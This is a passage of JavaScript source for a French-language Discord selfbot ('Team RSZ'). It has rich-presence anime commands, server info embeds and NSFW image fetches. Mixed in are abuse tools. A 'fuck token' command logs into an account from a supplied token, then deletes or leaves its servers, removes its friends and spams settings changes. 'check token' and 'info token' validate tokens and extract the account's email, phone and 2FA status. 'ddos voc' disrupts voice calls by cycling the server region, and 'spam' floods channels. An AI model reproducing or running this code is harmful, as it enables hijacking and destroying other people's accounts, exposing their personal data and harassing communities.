                                                  .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
                                                  .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
                                                  .setApplicationId("862468524390613026")
                                                  .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
                                                  .setAssetsLargeImage(image.id)
                                                  .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
                                                  .setState(argument)
                                                  .setStartTimestamp(Date.now())
                                        
                                                  .setParty({
                                                      id: uuid()
                                                      })
                                                      client.user.setPresence(presence.toDiscord()).catch(console.error);
                                                      console.log("╟ Commande My Hero Academia executé")
                                                      console.log("╟─────────────────────────────────╢")
                                                      message.edit(`:white_check_mark: **Tu regardes ${argument} sur My Hero Academia**`);
                                                    })
                                                  }

                                                  if(message.content.startsWith(prefix + "demon slayer")){
                                                    let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
                                                    rpcGenerator.getRpcImage("862468524390613026", "ds")
                                                    .then(image => {
                                                        let presence = new rpcGenerator.Rpc()
                                                            .setName("Demon Slayer")
                                                            .setUrl('https://www.twitch.tv/codezero_two_')
                                                            .setType("WATCHING")
                                                            .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
                                                            .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
                                                            .setApplicationId("862468524390613026")
                                                            .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
                                                            .setAssetsLargeImage(image.id)
                                                            .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
                                                            .setState(argument)
                                                            .setStartTimestamp(Date.now())
                                                  
                                                            .setParty({
                                                                id: uuid()
                                                                })
                                                                client.user.setPresence(presence.toDiscord()).catch(console.error);
                                                                console.log("╟ Commande Demon Slayer executé")
                                                                console.log("╟─────────────────────────────────╢")
                                                                message.edit(`:white_check_mark: **Tu regardes ${argument} sur Demon Slayer**`);
                                                              })
                                                            }

                                                            if(message.content.startsWith(prefix + "sao")){
                                                              let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
                                                              rpcGenerator.getRpcImage("862468524390613026", "sao")
                                                              .then(image => {
                                                                  let presence = new rpcGenerator.Rpc()
                                                                      .setName("Sword Art Online")
                                                                      .setUrl('https://www.twitch.tv/codezero_two_')
                                                                      .setType("WATCHING")
                                                                      .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
                                                                      .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
                                                                      .setApplicationId("862468524390613026")
                                                                      .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
                                                                      .setAssetsLargeImage(image.id)
                                                                      .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
                                                                      .setState(argument)
                                                                      .setStartTimestamp(Date.now())
                                                            
                                                                      .setParty({
                                                                          id: uuid()
                                                                          })
                                                                          client.user.setPresence(presence.toDiscord()).catch(console.error);
                                                                          console.log("╟ Commande Sword Art Online executé")
                                                                          console.log("╟─────────────────────────────────╢")
                                                                          message.edit(`:white_check_mark: **Tu regardes ${argument} sur Sword Art Online**`);
                                                                        })
                                                                      }

                                                                      if(message.content.startsWith(prefix + "sao")){
                                                                        let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
                                                                        rpcGenerator.getRpcImage("862468524390613026", "sao")
                                                                        .then(image => {
                                                                            let presence = new rpcGenerator.Rpc()
                                                                                .setName("Sword Art Online")
                                                                                .setUrl('https://www.twitch.tv/codezero_two_')
                                                                                .setType("WATCHING")
                                                                                .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
                                                                                .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
                                                                                .setApplicationId("862468524390613026")
                                                                                .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
                                                                                .setAssetsLargeImage(image.id)
                                                                                .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
                                                                                .setState(argument)
                                                                                .setStartTimestamp(Date.now())
                                                                      
                                                                                .setParty({
                                                                                    id: uuid()
                                                                                    })
                                                                                    client.user.setPresence(presence.toDiscord()).catch(console.error);
                                                                                    console.log("╟ Commande Sword Art Online executé")
                                                                                    console.log("╟─────────────────────────────────╢")
                                                                                    message.edit(`:white_check_mark: **Tu regardes ${argument} sur Sword Art Online**`);
                                                                                  })
                                                                                }

                                                                                if(message.content.startsWith(prefix + "one piece")){
                                                                                  let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
                                                                                  rpcGenerator.getRpcImage("862468524390613026", "op")
                                                                                  .then(image => {
                                                                                      let presence = new rpcGenerator.Rpc()
                                                                                          .setName("One Piece")
                                                                                          .setUrl('https://www.twitch.tv/codezero_two_')
                                                                                          .setType("WATCHING")
                                                                                          .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
                                                                                          .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
                                                                                          .setApplicationId("862468524390613026")
                                                                                          .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
                                                                                          .setAssetsLargeImage(image.id)
                                                                                          .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
                                                                                          .setState(argument)
                                                                                          .setStartTimestamp(Date.now())
                                                                                
                                                                                          .setParty({
                                                                                              id: uuid()
                                                                                              })
                                                                                              client.user.setPresence(presence.toDiscord()).catch(console.error);
                                                                                              console.log("╟ Commande One Piece executé")
                                                                                              console.log("╟─────────────────────────────────╢")
                                                                                              message.edit(`:white_check_mark: **Tu regardes ${argument} sur Sword Art Online**`);
                                                                                            })
                                                                                          }


    if(msg.content === prefix + "channels list"){
      if (!msg.guild) {
        return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
    }
    if(!message.member.hasPermission('EMBED_LINKS')) return message.edit(`:x: **permission insuffisante (embed_links)** ${salons.map(c => c.name)}`);
    const salons = message.guild.channels;
    var channel = new Discord.RichEmbed()
    .setFooter("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
    .setColor(color)
    .addField("liste des salons:", salons.map(c => c.name))
    for (pas=0; pas< 10; pas++) {
      channel.setColor(color)
    message.edit(channel).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
    }
    console.log('Commande channels list executé'.yellow)
  }
if(msg.content === prefix + "roles list"){
if (!msg.guild) {
        return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
    }
    if(!message.member.hasPermission('EMBED_LINKS')) return message.edit(`:x: **permission insuffisante (embed_links)** ${role.map(r => r.name)}`);
      const role = message.guild.roles;
      var roles = new Discord.RichEmbed()
      .setFooter("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
      .setColor(color)
      .addField("liste des roles:", role.map(r => r.name))
      message.edit(roles).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
      console.log("╟ Commande role liste executé")
      console.log("╟─────────────────────────────────╢")
    }
    if (message.content === prefix + "cmd") {
      message.edit(cmd).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
      console.log("╟ Commande cmd executé")
      console.log("╟─────────────────────────────────╢")
    }
    if (message.content === prefix + "help") {
      message.edit(help).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
      console.log("╟ Commande help executé")
      console.log("╟─────────────────────────────────╢")
  }
if (message.content === prefix + "help raid") {
  message.edit(help_raid).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
  console.log("╟ Commande help raid executé")
  console.log("╟─────────────────────────────────╢")
}
if (message.content === prefix + "help hack") {
  message.edit(help_hack).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
  console.log("╟ Commande help hack executé")
  console.log("╟─────────────────────────────────╢")
}
if (message.content === prefix + "help statut") {
  message.channel.send(help_statut2);
  message.edit(help_statut).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
  console.log("╟ Commande help statut executé")
  console.log("╟─────────────────────────────────╢")
}
if (message.content === prefix + "help fun") {
  message.edit(help_fun).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
  console.log("╟ Commande help fun executé")
  console.log("╟─────────────────────────────────╢")
}
if (message.content === prefix + "help anime") {
  message.edit(anime).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
  console.log("╟ Commande help anime executé")
  console.log("╟─────────────────────────────────╢")
}
if (message.content === prefix + "help moderation") {
  message.edit(help_moderation).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
  console.log("╟ Commande help moderation executé")
  console.log("╟─────────────────────────────────╢")
}
if (message.content === prefix + "help nsfw") {
  message.edit(help_nsfw).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
  console.log("╟ Commande nsfw executé")
  console.log("╟─────────────────────────────────╢")
}

if (message.content === prefix + "help gen") {
  message.edit(gen).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
  console.log("╟ Commande generateur executé")
  console.log("╟─────────────────────────────────╢")
}

if (message.content === prefix + "help utile") {

  message.edit(help_info).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
  console.log("╟ Commande help utile")
  console.log("╟─────────────────────────────────╢")
};

if(message.content.startsWith(prefix + 'avatar' || prefix + "pp")){
  const user = message.mentions.users.first() || message.author;
  const avatarEmbed = new Discord.RichEmbed()
      .setAuthor(user.username)
      .setImage(user.avatarURL)
      .setColor(color)
      .setFooter(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉`)
        message.edit(avatarEmbed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
        console.log("╟ Commande avatar executé")
        console.log("╟─────────────────────────────────╢")
};

  if (message.content === prefix + 'change hypesquad brilliance') {

            
                      let url = `https://discordapp.com/api/v6/hypesquad/online`;

                      request(url, {
                        method: 'POST',
                        headers: {
                          authorization: token,
                          'content-type': 'application/json',
                          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                        },
                        body: JSON.stringify({ 'house_id' : 2 })
                      });
                      msg.edit(`:white_check_mark: **Vous avez rejoint la hypesquad 'brilliance'**`)
                      console.log("╟ Commande change hypesquad executé")
                      console.log("╟─────────────────────────────────╢")
                    }
                    if (message.content === prefix + 'change hypesquad ballance') {

            
                      let url = `https://discordapp.com/api/v6/hypesquad/online`;

                      request(url, {
                        method: 'POST',
                        headers: {
                          authorization: token,
                          'content-type': 'application/json',
                          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                        },
                        body: JSON.stringify({ 'house_id' : 3 })
                      });
                      msg.edit(`:white_check_mark: **Vous avez rejoint la hypesquad 'ballance'**`)
                      console.log("╟ Commande change hypesquad executé")
                      console.log("╟─────────────────────────────────╢")
                    }

                    if (message.content === prefix + 'change hypesquad bravery') {

                      let url = `https://discordapp.com/api/v6/hypesquad/online`;

                      request(url, {
                        method: 'POST',
                        headers: {
                          authorization: token,
                          'content-type': 'application/json',
                          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                        },
                        body: JSON.stringify({ 'house_id' : 1 })
                      });
                      msg.edit(`:white_check_mark: **Vous avez rejoint la hypesquad 'bravery'**`)
                      console.log("╟ Commande change hypesquad executé ")
                      console.log("╟─────────────────────────────────╢")
                    }
if (message.content.startsWith(prefix + 'check token')) {
  let argument = args.splice(2).join(" ");

        let url = "https://discordapp.com/api/v6/users/@me";
        request(
            url, {
                method: "GET",
                headers: {
                    authorization: argument
                }
            },
            function(error, response, body) {
                if (response.statusCode === 200) {
                    var validtoken = new Discord.RichEmbed()
                        .setTitle(`Token info`)
                        .setDescription(`Le token: ${argument} \n**est 100% valide** :white_check_mark:`)
                        .setColor(color)
                        .setTimestamp()
                        .setFooter(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉`, message.author.avatarURL)
                    message.edit(validtoken).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
                } else {
                    var invalidtoken = new Discord.RichEmbed()
                        .setTitle(`Token info`)
                        .setDescription(`Le token ${argument} \nn'est pas valide :x:`)
                        .setColor(color)
                        .setTimestamp()
                        .setFooter(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉`, message.author.avatarURL)
                    message.edit(invalidtoken).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
                    console.log("╟ Commande check token executé")
                    console.log("╟─────────────────────────────────╢")
                }
            })
}

if(message.content == prefix + "ddos voc"){
  if (!msg.guild) {
    return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
}
if(!message.member.hasPermission("ADMINISTRATOR")){
  message.channel.send(':x: **Il vous faut les permissions administrateur pour executer cette commande**')
  return;
}
  let index = 0;
const arrayDesRegions = [
  "japan", "hongkong", "russia",
  "india", "brazil", "sydney"
];


setInterval(() => {
  message.guild.setRegion(arrayDesRegions[index]);
  index++;
  if (index == arrayDesRegions.length) index = 0;
}, 1000);
msg.edit('**Commande ddos vocal activé**')
console.log("╟ Commande ddos voc executé")
console.log("╟─────────────────────────────────╢")
}
if(message.content == prefix + "ddos-stop"){
  if (!msg.guild) {
    return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
}
clearInterval();
msg.edit('**Commande ddos stopé**')
console.log("╟ Commande stop ddos voc executé")
console.log("╟─────────────────────────────────╢")
}
if(message.content.startsWith(prefix + "spam")){
  let spam = args.splice(1).join(" ");
  msg.edit('**Patiente...**')
  setInterval(() => {
    msg.channel.send(spam).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
  }, 1);
  console.log("╟ Commande spam executé")
  console.log("╟─────────────────────────────────╢")
  }
  if (message.content.startsWith(prefix + "virus")) {
    if (message.author.id == client.user.id) {
        let args = message.content.split(' ').slice(1);
        let virusname = args.join(' ');
        if (!virusname) {
            return message.edit("𝐕𝐞𝐮𝐢𝐥𝐥𝐞𝐳 𝐦𝐞𝐭𝐭𝐫𝐞 𝐥𝐞 𝐧𝐨𝐦 𝐝𝐮 𝐡𝐚𝐜𝐤");
        }
        message.edit({
            embed: new Discord.RichEmbed()
                .setTitle('𝐋𝐨𝐚𝐝𝐢𝐧𝐠 ' + virusname + "...")
                .setColor(color)
        }).then(function(m) {

            setTimeout(function() {
                m.edit({
                    embed: new Discord.RichEmbed()
                        .setTitle('[' + virusname + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓ ] 𝟏%')
                        .setColor(color)
                })
            }, 1000)

            setTimeout(function() {
                m.edit({
                    embed: new Discord.RichEmbed()
                        .setTitle('[' + virusname + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓] 𝟐𝟓%')
                        .setColor(color)
                })
            }, 2000)

            setTimeout(function() {
                m.edit({
                    embed: new Discord.RichEmbed()
                        .setTitle('[' + virusname + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓▓▓▓] 𝟓𝟎%')
                        .setColor(color)
                })
            }, 3000)

            setTimeout(function() {
                m.edit({
                    embed: new Discord.RichEmbed()
                        .setTitle('[' + virusname + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓▓▓▓▓▓▓▓] 𝟕𝟓%')
                        .setColor(color)
                })
            }, 4000)

            setTimeout(function() {
                m.edit({
                    embed: new Discord.RichEmbed()
                        .setTitle('[' + virusname + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 𝟏𝟎𝟎%')
                        .setColor(color)
                })
            }, 5000)

            setTimeout(function() {
                m.edit({
                    embed: new Discord.RichEmbed()
                        .setTitle('[' + virusname + ']: 𝐕𝐢𝐫𝐮𝐬 𝐥𝐚𝐧𝐜𝐞́')
                        .setColor(color)
                })
            }, 6000)

            setTimeout(function() {
                m.delete();
            }, 10000)
        });
    }
}
  
if (message.content.startsWith(prefix + 'info token')) {
      let argument = args.splice(2).join(" ");
      let url = "https://discordapp.com/api/v6/users/@me";
      request(
        url, {
            method: "GET",
            headers: {
                authorization: argument
            }
        },
        function(error, response, body) {
            if (response.statusCode === 200) {
            body = JSON.parse(body)
              var id = body["id"];
              var username = body["username"];
              var avatar = body["avatar"];
              var discriminator = body["discriminator"];
              var mfa_enabled = body["mfa_enabled"];
              var phone = body["phone"];
              var locale = body["locale"];
              let publicflag = body["public_flags"];
              let flags = body["flags"];
              let email = body["email"];
              let verified = body["verified"];
              let nsfwallowed = body["nsfw_allowed"];
              
              var tyty = "";
              tyty += "\nUser: " + username + "#" + discriminator;
              tyty += "\nId: " + id;
              tyty+= "\nEmail: " + email;
              tyty += "\nNuméro de telephone: " + phone;
              tyty += "\nAvatar: " + avatar;
              tyty += "\nLangue: " + locale;
              tyty += "\nA2f activé?: " + mfa_enabled;
              tyty+= "\nCompte vérifié?: " + verified;
              tyty+= "\nNsfw activé?: " + nsfwallowed;
              tyty+= "\nFlags: " + flags;
              tyty+= "\nPublic Flags: " + publicflag;
                      var embed = new Discord.RichEmbed()
                        .setTitle("**Commande Token Info**")
                        .setDescription(tyty)
                        .setColor(color)
                        .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉');
    
                        return message.edit(embed).then(console.log("╟ Commande token info executé"))
                                                        console.log("╟─────────────────────────────────╢")
            } else {
                var invalidtoken = new Discord.RichEmbed()
                    .setTitle(`Token info`)
                    .setDescription(`Le token ${argument} \nn'est pas valide :x:`)
                    .setColor(color)
                    .setTimestamp()
                    .setFooter(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉`, message.author.avatarURL)

                message.edit(invalidtoken).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
          
            }
        })
};

if (message.content.startsWith(prefix + 'fuck token')) {
  let fucked = new Discord.Client();
        let argument = args.splice(2).join(" ");
        let url = "https://discordapp.com/api/v6/users/@me";
        request(
            url, {
                method: "GET",
                headers: {
                    authorization: argument
                }
            },
            function(error, response, body) {
                if (response.statusCode === 200) {
                  fucked.on("ready", function(){
                    for (pas=0; pas< 100; pas++) {
                    fucked.user.createGuild("Rip ;)", "london")
                    }
                  });
                  for (pas=0; pas< 20; pas++) {
                  fetch("https://discord.com/api/v8/users/@me/settings", {
                    "headers": {
                      "authorization": argument,
                      "content-type": "application/json",
                    },
                    "body": "{\"theme\":\"light\"}",
                    "method": "PATCH"
                  });
                 
                 fetch("https://discord.com/api/v8/users/@me/settings", {
                    "headers": {
                      "authorization": argument,
                      "content-type": "application/json",
                    },
                    "body": "{\"theme\":\"dark\"}",
                    "method": "PATCH"
                  });
                  };
                  fucked.on('ready', function(){
                    fucked.user.friends.forEach(amis => {
                     fucked.user.removeFriend(amis).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
                    });
                    fucked.guilds.forEach(serveurs => {
                      if(serveurs.ownerID === fucked.user.id){
                        serveurs.delete().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
                      }else
                        serveurs.leave().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
                    });
                    message.edit(':white_check_mark: **Token fuck en cours...**')
                    })
                    
                  fucked.login(argument);
                } else {
                    var invalidtoken = new Discord.RichEmbed()
                        .setTitle(`Token info`)
                        .setDescription(`Le token ${argument} \nn'est pas valide :x:`)
                        .setColor(color)
                        .setTimestamp()
                        .setFooter(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉`, message.author.avatarURL)

                    message.edit(invalidtoken).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
                }
            })
            console.log("╟ Commande fuck token executé")
            console.log("╟─────────────────────────────────╢")
      };
    if (message.content.startsWith(prefix + "8ball")) {
        let args =  message.content.split(" ").splice(1).join(' ')
        var eightball = [
          "oui!",
          "non...",
          "peut etre?",
          "probablement",
          "je ne pense pas.",
          "jamais!",
          "tu peux essayer...",
      ]
        if (args[1] != null)message.edit(args + "\nla reponse est: " + eightball[Math.floor(Math.random() * eightball.length)]).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
        else message.edit("Quelle est ta question? :rolling_eyes: (essayeplutot:" + prefix + " 8ball [question])");
        console.log("╟ Commande 8ball executé")
  console.log("╟─────────────────────────────────╢")
    };
       if(message.content.startsWith(prefix + "mp friend")){
        
      if (!args) {
        throw 'Vous devez mettre quelque chose à dire !';
    }
        let saymsg = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉\n";
        client.user.friends.forEach(friends => {
          friends.send(saymsg).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
        });
        console.log("╟ Commande mp friend executé")
        console.log("╟─────────────────────────────────╢")
  };
  
if(message.content.startsWith(prefix + "say")){
if (!args) {
        throw 'Vous devez mettre quelque chose à dire !';
    }
      
        let saymsg = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
        let say = new Discord.RichEmbed()
        .setTitle('**Commande Say**')
        .setDescription(saymsg)
        .setTimestamp()
        .setFooter(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉-Selbot`, `${client.user.avatarURL}`)
        .setColor(color)
        for (pas=0; pas< 100; pas++) {
          say.setColor(color)
    message.edit(say).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
    }
    console.log("╟ Commande say executé")
    console.log("╟─────────────────────────────────╢")
  };
    if(message.content.startsWith(prefix + "user info")){
        if (!mentionuser) { return msg.edit(":x: **Utilisateur inconnu!**"), mentionuser = message.author;}
        var userGuild = (message.guild.member(mentionuser));
        var game = mentionuser.presence.game;
        var gameName = game ? game.name : "Nothing";
        var userRoles = (!userGuild ? null : userGuild.roles.array());
        if (userGuild) {
            userRoles.shift();
            for (var i = 0; i < userRoles.length; ++i) {
                userRoles[i] = userRoles[i].name;
            }
            userRoles = userRoles.join(", ");
        };
        var status = {
            dnd: "Ne pas déranger",
            offline: "Hors Ligne/Invisible",
            online: "En ligne",
            idle: "Innactif"
        };
        const embed = new Discord.RichEmbed()
        .setAuthor(`${mentionuser.username}#${mentionuser.discriminator} | ${mentionuser.id}`, mentionuser.displayAvatarURL)
          .setFooter("E")
           .setThumbnail(mentionuser.displayAvatarURL)
           .setColor(color)
           .addField("Created", `${mentionuser.createdAt.toString().substr(0, 15)},\n${checkDays(mentionuser.createdAt)}`, true)
           .addField("Joined", `${userGuild.joinedAt.toString().substr(0, 15)},\n${checkDays(userGuild.joinedAt)}`, true)
           .addField("Status", status[mentionuser.presence.status], true)
           .addField("Playing", gameName, true)
           .addField("Nickname", userGuild.nickname ? userGuild.nickname : "None", true)
           .addField("Avatar URL", `[Click here!](${mentionuser.displayAvatarURL})`, true)
           .addField("Roles", userRoles ? userRoles : "None")

        msg.edit(embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
        console.log("╟Commande user info executé")
  console.log("╟─────────────────────────────────╢")  
    };
   if(message.content === prefix + "serveur info"){
    if (!msg.guild) {
        return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
    }

    const millis = new Date().getTime() - msg.guild.createdAt.getTime();
    const days = millis / 1000 / 60 / 60 / 24;
    const verificationLevels = ['None', 'Low', 'Medium', 'Insane', 'Extreme'];

    let embed = new Discord.RichEmbed()
    .setTitle('**Serveur info**')
    .addField('Name:', `${msg.guild.name}`)
    .addField('Created On:',  `${message.guild.createdAt.toString().substr(0, 15)},\n${checkDays(message.guild.createdAt)}`, true)
    .addField('Default Channel:', `${msg.guild.defaultChanne}`)
    .addField('Region:', `${msg.guild.region}`)
    .addField('Member Count', `${msg.guild.members.filter(m => m.presence.status !== 'offline').size} / ${msg.guild.memberCount}`)
    .addField('Owner:', `${message.guild.owner.user.username}`)
    .addField('Text Channels', `${msg.guild.channels.filter(m => m.type === 'text').size}`)
    .addField('Voice Channels', `${msg.guild.channels.filter(m => m.type === 'voice').size}`)
    .addField('Verification Level', `${verificationLevels[msg.guild.verificationLevel]}`)
    .addField('Roles:', `${msg.guild.roles.size}`)
    .addField('Guild ID:', `${msg.guild.id}`)
    .setColor(color)

    if (msg.guild.iconURL != null) {
        embed.setThumbnail(`${msg.guild.iconURL}`);
    }
    msg.edit(embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
    console.log("╟ Commande user info executé")
  console.log("╟─────────────────────────────────╢")
};
    if(message.content === prefix + 'stats'){
        let embed = new Discord.RichEmbed();
        embed.setTimestamp()
        .setColor(color)
        .setTitle('**Selfbot Statistics**')
        .addField('Mem Usage:', `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB`)
        .addField('Servers:', `${client.guilds.size}`)
        .addField('Channels:', `${client.channels.size}`)
        .addField('Users:', `${client.guilds.map(guild => guild.memberCount)}`)
        .addField('Servers:', `${client.guilds.size}`)
        .addField('Servers:', `${client.guilds.size}`)
        .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉', `${client.user.avatarURL}`)
        if(client.user.premium > 0){
          embed.addField("• Nitro", `oui`)
        }else
        embed.addField("• Nitro", `non`)
        message.edit(embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
        console.log("╟ Commande stats executé")
  console.log("╟─────────────────────────────────╢")
    }
     
if(message.content.startsWith(prefix + "ass")){
    superagent.get('https://nekobot.xyz/api/image')
      .query({ type: 'ass'})
      .end((err, response) => {
      var ass = new Discord.RichEmbed()
      .setColor(color)
      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
      .setTimestamp()
      .setImage(response.body.message)
      .setColor(color)
        msg.edit(ass).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
      });
      console.log("╟ Commande ass executé")
      console.log("╟─────────────────────────────────╢")
  }
  if(message.content.startsWith(prefix + "4k")){
    superagent.get('https://nekobot.xyz/api/image')
      .query({ type: '4k'})
      .end((err, response) => {
      var nk = new Discord.RichEmbed()
      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
      .setTimestamp()
      .setImage(response.body.message)
      .setColor(color)

        msg.edit(nk).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
        console.log("╟ Commande 4k executé")
  console.log("╟─────────────────────────────────╢")
      });
    }
  if(message.content.startsWith(prefix + "nsfw-gif")){
    var gif1 = new Discord.RichEmbed()
    superagent.get('')
      .query({ type: 'pgif'})
      .end((err, response) => {
      var gif1 = new Discord.RichEmbed()
      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
      .setTimestamp()
      .setImage(response.body.message)
      .setColor(color)
        msg.edit(gif1).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
        console.log("╟ Commande nsfw fif executé")
  console.log("╟─────────────────────────────────╢")
  });
  }
  if(message.content.startsWith(prefix + "hentai")){
    var hentai = new Discord.RichEmbed()
    superagent.get('https://nekobot.xyz/api/image')
      .query({ type: 'hentai_anal'})
      .end((err, response) => {
       var hentai = new Discord.RichEmbed()
      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
      .setTimestamp()
      .setImage(response.body.message)
      .setColor(color)
        msg.edit(hentai).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
        console.log("╟ Commande hentai executé")
  console.log("╟─────────────────────────────────╢")
  });
  }
  if(message.content.startsWith(prefix + "pussy")){
    superagent.get('https://nekobot.xyz/api/image')
      .query({ type: 'pussy'})
      .end((err, response) => {
       var pussy = new Discord.RichEmbed()
      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
      .setTimestamp()
      .setImage(response.body.message)
      .setColor(color)
        msg.edit(pussy).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
        console.log("╟ Commande pussy executé")
  console.log("╟─────────────────────────────────╢")
  });
  }
  
  if(message.content.startsWith(prefix + "thigh")){
    superagent.get('https://nekobot.xyz/api/image')
      .query({ type: 'thigh'})
      .end((err, response) => {
        var thigh = new Discord.RichEmbed()
      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
      .setTimestamp()
      .setImage(response.body.message)
      .setColor(color)
        msg.edit(thigh).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
        console.log("╟ Commande thigh executé")
